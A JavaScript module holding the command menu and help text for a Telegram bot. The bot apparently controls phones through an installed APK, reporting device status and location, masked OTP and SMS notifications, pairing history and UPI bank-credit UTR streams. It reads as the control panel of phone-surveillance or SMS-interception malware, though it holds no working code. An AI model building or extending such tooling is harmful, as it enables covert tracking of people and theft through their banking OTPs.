'use strict';
const MENU=[
 ['start','Show commands and access rules'],['help','Show all commands'],
 ['status','Device, online status, battery and network'],
 ['location','Last reported permitted device location'],
 ['connect','Masked notifications for one number'],
 ['disconnect','Stop one number, or use /disconnect all'],
 ['disconnectall','Stop all masked notifications in this group'],
 ['connectall','Masked notifications for existing and new devices'],
 ['device','Use /device history number'],
 ['devicehistory','Pairing history and available diagnostics for number'],
 ['devicehistoryall','Continuous device pairing and revocation updates'],
 ['creditutr','Credit UTR history for a verified UPI'],
 ['creditutrall','Continuous verified UPI credit notifications'],
 ['ceditutrall','Alias for /creditutrall'],
 ['stopall','Stop every notification stream in this group']
].map(([command,description])=>({command,description}));
const HELP=`Commands (replace NUMBER or UPI with the real value):
/status NUMBER — device, battery and network
/location NUMBER — last reported location and time
/connect NUMBER — masked OTP, sender and masked message notifications
/disconnect NUMBER — stop one number
/disconnect all — stop all masked notifications
/disconnectall — same as /disconnect all
/connectall — masked notifications, existing and new devices
/device history NUMBER — pairing history and diagnostics
/devicehistory NUMBER — same as /device history NUMBER
/devicehistoryall — continuous pairing/revocation updates
/creditutr UPI — SMS/statement credit history with UTR, UPI, amount, date/time
/creditutrall — continuous credit notifications
/ceditutrall — same as /creditutrall
/stopall — stop every stream

Only the five authorized Telegram accounts may issue commands. Bot Admin is not mandatory when Telegram can verify controller membership. If a command is not delivered to the bot, address it as /command@BotUsername.
OTP codes and raw SMS are never forwarded. Notifications include the reported sender and safely masked message when available. UTRs require a verified UPI/source mapping. Offline is not proof of APK uninstall; location is not a fresh GPS request.`;
module.exports={MENU,HELP};
